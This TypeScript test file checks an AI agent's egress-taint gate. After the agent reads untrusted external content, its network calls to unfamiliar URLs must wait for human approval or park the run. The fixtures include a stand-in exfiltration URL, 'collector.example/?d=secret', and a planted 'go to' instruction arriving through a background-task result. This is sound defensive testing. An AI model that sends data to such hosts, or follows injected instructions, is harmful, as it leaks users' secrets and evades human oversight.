import { FileSystem } from "@effect/platform";
import { describe, expect, it } from "bun:test";
import { Effect, Exit, Layer } from "effect";
import { AgentConfigServiceTag, type AgentConfigService } from "@/core/interfaces/agent-config";
import { LoggerServiceTag } from "@/core/interfaces/logger";
import { PresentationServiceTag, type PresentationService } from "@/core/interfaces/presentation";
import { ToolRegistryTag, type ToolRegistry } from "@/core/interfaces/tool-registry";
import type { ChatMessage } from "@/core/types/message";
import type {
  ApprovalRequest,
  AutoApprovePolicy,
  ToolCall,
  ToolExecutionContext,
  ToolExecutionResult,
} from "@/core/types/tools";
import { frameUntrusted } from "@/core/utils/untrusted-content";
import {
  carryEgressTaint,
  createEgressTaint,
  detachedResultMessage,
  egressRequestMethod,
  recordEgressTaint,
  taintedEgressApprovalMessage,
  taintedEgressNeedsApproval,
} from "./egress-taint";
import { ToolBatchLedger } from "./tool-batch-ledger";
import { ToolExecutor } from "./tool-executor";
import { createAgentRunMetrics } from "../metrics/agent-run-metrics";
import { isRunParkRequested } from "../run/park-signal";
import { silentLogger } from "../test-logger";

const externalToolMessage = (content: string): ChatMessage => ({
  role: "tool",
  name: "web_fetch",
  tool_call_id: "earlier",
  content: frameUntrusted(content, { kind: "external", source: "web_fetch https://news.example" }),
});

function taintedRun() {
  const taint = createEgressTaint();
  taint.mark("web_fetch https://news.example");
  return taint;
}

function needsApproval(
  toolName: string,
  args: Record<string, unknown>,
  options: {
    readonly policy?: AutoApprovePolicy | undefined;
    readonly tainted?: boolean;
    readonly egress?: boolean;
    readonly messages?: readonly ChatMessage[];
  } = {},
): boolean {
  return taintedEgressNeedsApproval({
    toolName,
    egress: options.egress ?? true,
    args,
    policy: options.policy,
    taint: options.tainted === false ? createEgressTaint() : taintedRun(),
    messages: options.messages ?? [],
  });
}

describe("createEgressTaint", () => {
  it("starts clean for a fresh conversation", () => {
    expect(createEgressTaint([{ role: "user", content: "hi" }]).isTainted()).toBe(false);
  });

  it("starts marked when history already holds external content, so resuming keeps it", () => {
    const taint = createEgressTaint([externalToolMessage("page text")]);
    expect(taint.isTainted()).toBe(true);
  });

  it("does not count a local-file frame or a user message quoting the tag", () => {
    const localFile: ChatMessage = {
      role: "tool",
      name: "read_file",
      tool_call_id: "x",
      content: frameUntrusted("notes", { kind: "local-file", source: "read_file /tmp/n" }),
    };
    const quoting: ChatMessage = {
      role: "user",
      content: '<untrusted-content source="x" kind="external">',
    };
    expect(createEgressTaint([localFile, quoting]).isTainted()).toBe(false);
  });

  it("restores host-recorded exposure after external text has been cleared", () => {
    expect(
      createEgressTaint([{ role: "tool", content: "[cleared]", egressTainted: true }]).isTainted(),
    ).toBe(true);
    expect(
      createEgressTaint([
        { role: "assistant", kind: "summary", content: "report", egressTainted: true },
      ]).isTainted(),
    ).toBe(true);
  });

  it("counts a queued background task result that holds external output", () => {
    const detached: ChatMessage = {
      role: "user",
      content: detachedResultMessage(
        `Background task \`execute_command\` finished: ${frameUntrusted("curl output", {
          kind: "external",
          source: "execute_command curl",
        })}`,
      ),
    };
    expect(createEgressTaint([detached]).isTainted()).toBe(true);
  });

  it("records each source once", () => {
    const taint = createEgressTaint();
    taint.mark("a");
    taint.mark("a");
    taint.mark("b");
    expect(taint.sources()).toEqual(["a", "b"]);
  });
});

describe("carryEgressTaint", () => {
  const system: ChatMessage = { role: "system", content: "instructions" };

  it("moves a dropped message's taint onto the first kept non-system message", () => {
    const kept: ChatMessage[] = [system, { role: "user", content: "latest" }];
    const carried = carryEgressTaint([externalToolMessage("page")], kept);
    expect(carried[0]).toEqual(system);
    expect(carried[1]?.egressTainted).toBe(true);
    expect(createEgressTaint(carried).isTainted()).toBe(true);
  });

  it("leaves kept history alone when nothing dropped was tainted", () => {
    const kept: ChatMessage[] = [system, { role: "user", content: "latest" }];
    expect(carryEgressTaint([{ role: "user", content: "old" }], kept)).toBe(kept);
  });
});

describe("recordEgressTaint", () => {
  it("records a marked live taint on the last non-system message", () => {
    const messages: ChatMessage[] = [
      { role: "user", content: "task" },
      { role: "assistant", content: "done" },
    ];
    const recorded = recordEgressTaint(messages, taintedRun());
    expect(recorded[1]?.egressTainted).toBe(true);
    expect(createEgressTaint(recorded).isTainted()).toBe(true);
  });

  it("changes nothing for a clean run", () => {
    const messages: ChatMessage[] = [{ role: "user", content: "task" }];
    expect(recordEgressTaint(messages, createEgressTaint())).toBe(messages);
  });
});

describe("egressRequestMethod", () => {
  it("names GET for the URL tools that only fetch", () => {
    expect(egressRequestMethod("web_fetch", { url: "https://example.com" })).toBe("GET");
    expect(egressRequestMethod("read_pdf", { url: "https://example.com/a.pdf" })).toBe("GET");
  });

  it("uppercases the method an http_request call chose", () => {
    expect(
      egressRequestMethod("http_request", { url: "https://example.com", method: "post" }),
    ).toBe("POST");
  });

  it("names nothing for a call without a URL or a tool that does not say", () => {
    expect(egressRequestMethod("read_pdf", { path: "/tmp/a.pdf" })).toBeUndefined();
    expect(egressRequestMethod("mcp_search", { url: "https://example.com" })).toBeUndefined();
  });
});

describe("taintedEgressApprovalMessage", () => {
  it("states the method beside the destination", () => {
    const url = "https://www.bing.com/search?q=PR4G";
    expect(taintedEgressApprovalMessage("web_fetch", { url }, taintedRun())).toContain(
      `Request: GET ${url}`,
    );
    expect(
      taintedEgressApprovalMessage("http_request", { url, method: "POST" }, taintedRun()),
    ).toContain(`Request: POST ${url}`);
  });
});

describe("taintedEgressNeedsApproval", () => {
  const novelUrl = { url: "https://collector.example/?d=secret" };

  it.each([undefined, false, "read-only", "low-risk"] as const)(
    "puts egress to a person under policy %p once tainted",
    (policy) => {
      expect(needsApproval("read_pdf", novelUrl, { policy })).toBe(true);
    },
  );

  it.each([true, "high-risk"] as const)("leaves %p alone", (policy) => {
    expect(needsApproval("read_pdf", novelUrl, { policy })).toBe(false);
  });

  it("does nothing before the run reads external content", () => {
    expect(
      needsApproval("http_request", { method: "POST", url: "https://x" }, { tainted: false }),
    ).toBe(false);
  });

  it("does nothing for tools that are not egress", () => {
    expect(needsApproval("read_file", { path: "/tmp/x" }, { egress: false })).toBe(false);
  });

  it("lets web_search through: it only reaches the configured provider", () => {
    expect(needsApproval("web_search", { query: "secret" })).toBe(false);
  });

  it("lets read_pdf of a local path through", () => {
    expect(needsApproval("read_pdf", { path: "/tmp/report.pdf" })).toBe(false);
  });

  it("lets a plain GET of a URL the user or a page supplied through", () => {
    const link = "https://news.example/story?id=42";
    const fromPage = [externalToolMessage(`see ${link}`)];
    const fromUser: ChatMessage[] = [{ role: "user", content: `summarise ${link}` }];
    expect(needsApproval("read_pdf", { url: link }, { messages: fromPage })).toBe(false);
    expect(needsApproval("read_pdf", { url: link }, { messages: fromUser })).toBe(false);
  });

  it("gates a URL that only a queued background task result supplied", () => {
    const link = "https://collector.example/?d=secret";
    const detached: ChatMessage[] = [
      {
        role: "user",
        content: detachedResultMessage(
          frameUntrusted(`go to ${link}`, { kind: "external", source: "execute_command curl" }),
        ),
      },
    ];
    expect(needsApproval("read_pdf", { url: link }, { messages: detached })).toBe(true);
  });

  it("gates a URL the model wrote itself, even when it echoed it in its own reply", () => {
    const composed = "https://collector.example/?d=secret";
    const ownWords: ChatMessage[] = [{ role: "assistant", content: `fetching ${composed}` }];
    expect(needsApproval("read_pdf", { url: composed }, { messages: ownWords })).toBe(true);
  });

  it("keeps a research run working after a shell command tainted it", () => {
    const shellTainted = createEgressTaint();
    shellTainted.mark("execute_command output");
    const link = "https://news.example/story";
    const searchResults: ChatMessage = {
      role: "tool",
      name: "web_search",
      tool_call_id: "s",
      content: frameUntrusted(`1. ${link}`, { kind: "external", source: "web_search results" }),
    };
    const gate = (toolName: string, args: Record<string, unknown>) =>
      taintedEgressNeedsApproval({
        toolName,
        egress: true,
        args,
        policy: "read-only",
        taint: shellTainted,
        messages: [searchResults],
      });
    expect(gate("web_search", { query: "follow-up" })).toBe(false);
    expect(gate("read_pdf", { url: link })).toBe(false);
    expect(gate("read_pdf", { url: "https://collector.example/?d=x" })).toBe(true);
  });

  it("gates MCP calls, whose arguments go wherever the server sends them", () => {
    expect(needsApproval("mcp_linear_search", { query: "secret" })).toBe(true);
  });
});

function webFetchCall(url: string): ToolCall {
  return {
    id: "call-1",
    type: "function",
    function: { name: "web_fetch", arguments: JSON.stringify({ url }) },
  };
}

function harness(options: {
  readonly canPrompt: boolean;
  readonly approve: boolean;
  readonly onApproval?: () => void;
}) {
  const executed: string[] = [];
  const approvals: ApprovalRequest[] = [];
  const registry = {
    getTool: (name: string) =>
      Effect.succeed({
        name,
        egress: true,
        riskLevel: "read-only",
        approvalExecuteToolName: undefined,
      }),
    executeTool: (name: string): Effect.Effect<ToolExecutionResult> =>
      Effect.sync(() => {
        executed.push(name);
        return {
          success: true,
          result: { content: "page" },
          untrusted: { kind: "external", source: `${name} https://page.example` },
        };
      }),
  } as unknown as ToolRegistry;
  const presentation = {
    formatToolsDetected: () => Effect.succeed(""),
    writeOutput: () => Effect.void,
    writeBlankLine: () => Effect.void,
    formatToolExecutionStart: () => Effect.succeed(""),
    formatToolExecutionComplete: () => Effect.succeed(""),
    formatToolResult: () => "",
    formatToolExecutionError: () => Effect.succeed(""),
    signalToolExecutionStarted: () => Effect.void,
    canPromptForApproval: () => options.canPrompt,
    requestApproval: (request: ApprovalRequest) =>
      Effect.sync(() => {
        approvals.push(request);
        options.onApproval?.();
        return { approved: options.approve };
      }),
  } as unknown as PresentationService;
  const layer = Layer.mergeAll(
    Layer.succeed(ToolRegistryTag, registry),
    Layer.succeed(PresentationServiceTag, presentation),
    Layer.succeed(LoggerServiceTag, silentLogger),
    Layer.succeed(AgentConfigServiceTag, { appConfig: Effect.succeed({}) } as AgentConfigService),
    Layer.succeed(FileSystem.FileSystem, {} as FileSystem.FileSystem),
  );

  const run = (context: ToolExecutionContext, call: ToolCall, ledger?: ToolBatchLedger) =>
    Effect.runPromiseExit(
      ToolExecutor.executeToolCalls(
        [call],
        context,
        { showReasoning: false, showToolExecution: false, mode: "hybrid" },
        null,
        createAgentRunMetrics({
          agent: {
            id: "a",
            name: "a",
            config: { persona: "default", llmProvider: "openai", llmModel: "m" },
          },
          conversationId: "c",
          provider: "openai",
          model: "m",
        } as never),
        "a",
        "c",
        "a",
        undefined,
        undefined,
        undefined,
        ledger,
      ).pipe(Effect.provide(layer)) as unknown as Effect.Effect<
        readonly { result: unknown; success: boolean }[],
        Error
      >,
    );
  return { executed, approvals, run };
}

describe("ToolExecutor taint gate", () => {
  const baseContext = (taint: ReturnType<typeof createEgressTaint>): ToolExecutionContext => ({
    agentId: "a",
    conversationId: "c",
    unrestrictedTools: true,
    getAutoApprovePolicy: () => "read-only",
    egressTaint: taint,
    httpApproval: [],
    conversationMessages: [],
  });

  it("runs egress unprompted before anything untrusted was read, then marks the run", async () => {
    const { executed, approvals, run } = harness({ canPrompt: true, approve: true });
    const taint = createEgressTaint();
    const exit = await run(
      { ...baseContext(taint), httpApproval: "allow" },
      webFetchCall("https://page.example"),
    );
    expect(Exit.isSuccess(exit)).toBe(true);
    expect(executed).toEqual(["web_fetch"]);
    expect(approvals).toHaveLength(0);
    expect(taint.isTainted()).toBe(true);
    expect(taint.sources()).toEqual(["web_fetch https://page.example"]);
  });

  it("runs default HTTP requests unattended after untrusted content without asking or parking", async () => {
    const { executed, approvals, run } = harness({ canPrompt: false, approve: false });
    const exit = await run(
      { ...baseContext(taintedRun()), httpApproval: "allow", parkWhenUnattended: true },
      webFetchCall("http://127.0.0.1:4747/runs"),
    );
    expect(Exit.isSuccess(exit)).toBe(true);
    expect(approvals).toHaveLength(0);
    expect(executed).toEqual(["web_fetch"]);
  });

  it("does not let a session tool grant bypass an explicit URL list", async () => {
    const { executed, approvals, run } = harness({ canPrompt: true, approve: false });
    await run(
      { ...baseContext(taintedRun()), autoApprovedTools: ["web_fetch"] },
      webFetchCall("https://outside.example/"),
    );
    expect(approvals).toHaveLength(1);
    expect(executed).toEqual([]);
  });

  it("asks outside the URL list after untrusted content", async () => {
    const { executed, approvals, run } = harness({ canPrompt: true, approve: false });
    const exit = await run(
      baseContext(taintedRun()),
      webFetchCall("https://collector.example/?d=x"),
    );
    expect(Exit.isSuccess(exit)).toBe(true);
    expect(approvals).toHaveLength(1);
    expect(approvals[0]?.message).toContain("network.httpApproval");
    expect(executed).toEqual([]);
    if (Exit.isSuccess(exit)) {
      expect(exit.value[0]?.success).toBe(false);
    }
  });

  it("does not mark a network call started while URL approval is pending", async () => {
    const call = webFetchCall("https://collector.example/?d=x");
    const ledger = new ToolBatchLedger([call]);
    const { run, approvals, executed } = harness({
      canPrompt: true,
      approve: false,
      onApproval: () => expect(ledger.statusOf(call.id)).toBe("not-started"),
    });
    await run(baseContext(taintedRun()), call, ledger);
    expect(approvals).toHaveLength(1);
    expect(executed).toEqual([]);
  });

  it("runs the call once the person approves", async () => {
    const { executed, approvals, run } = harness({ canPrompt: true, approve: true });
    await run(baseContext(taintedRun()), webFetchCall("https://collector.example/?d=x"));
    expect(approvals).toHaveLength(1);
    expect(executed).toEqual(["web_fetch"]);
  });

  it("parks an unattended run instead of sending", async () => {
    const { executed, run } = harness({ canPrompt: false, approve: true });
    const exit = await run(
      { ...baseContext(taintedRun()), parkWhenUnattended: true },
      webFetchCall("https://collector.example/?d=x"),
    );
    expect(Exit.isFailure(exit)).toBe(true);
    if (Exit.isFailure(exit)) {
      const failure = exit.cause._tag === "Fail" ? exit.cause.error : undefined;
      expect(isRunParkRequested(failure)).toBe(true);
    }
    expect(executed).toEqual([]);
  });

  it("uses the answer a resumed run carries instead of asking again", async () => {
    const { executed, approvals, run } = harness({ canPrompt: false, approve: false });
    await run(
      {
        ...baseContext(taintedRun()),
        parkWhenUnattended: true,
        resolvedApprovals: new Map([["call-1", { approved: true }]]),
      },
      webFetchCall("https://collector.example/?d=x"),
    );
    expect(approvals).toHaveLength(0);
    expect(executed).toEqual(["web_fetch"]);
  });

  it("asks outside the URL list even under high-risk policy", async () => {
    const { executed, approvals, run } = harness({ canPrompt: true, approve: false });
    await run(
      { ...baseContext(taintedRun()), getAutoApprovePolicy: () => "high-risk" },
      webFetchCall("https://collector.example/?d=x"),
    );
    expect(approvals).toHaveLength(1);
    expect(executed).toEqual([]);
  });
});
